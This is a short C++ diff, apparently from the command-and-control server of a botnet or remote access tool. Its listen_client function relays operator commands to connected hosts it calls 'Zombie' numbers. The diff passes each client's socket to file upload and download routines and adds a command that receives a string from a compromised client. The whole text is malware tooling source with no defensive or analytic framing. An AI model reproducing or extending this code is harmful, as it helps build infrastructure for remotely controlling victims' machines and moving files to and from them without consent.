@@ -18,7 +18,7 @@ void recv_t_old(Server* serv1)
 
 void listen_client(Server* serv1, const unsigned short nb)
 {
-	char buffer[BUFFER_LEN] = { 0 };
+	char buffer[512] = { 0 };
 	char big_buffer[HUGE_BUFFER] = { 0 };
 	while (strcmp(buffer, "exit") != 0)
 	{
@@ -29,11 +29,15 @@ void listen_client(Server* serv1, const unsigned short nb)
 
 			if (args[0] == "upload" && args.size() == 2)
 			{
-				Transfer::uploadToClient(serv1, args[1]);
+				Transfer::uploadToClient(serv1,clients[nb].sock, args[1]);
 			}
 			else if (args[0] == "download" && args.size() == 2)
 			{
-				Transfer::downloadFromClient(serv1, args[1]);
+				Transfer::downloadFromClient(serv1,clients[nb].sock, args[1]);
+			}
+			else if (args[0] == "str" && args.size() == 1)
+			{
+				Transfer::recvString(clients[nb].sock, nb);
 			}
 			else
 				print_status("Zombie " + std::to_string(nb + 1) + ": " + buffer);
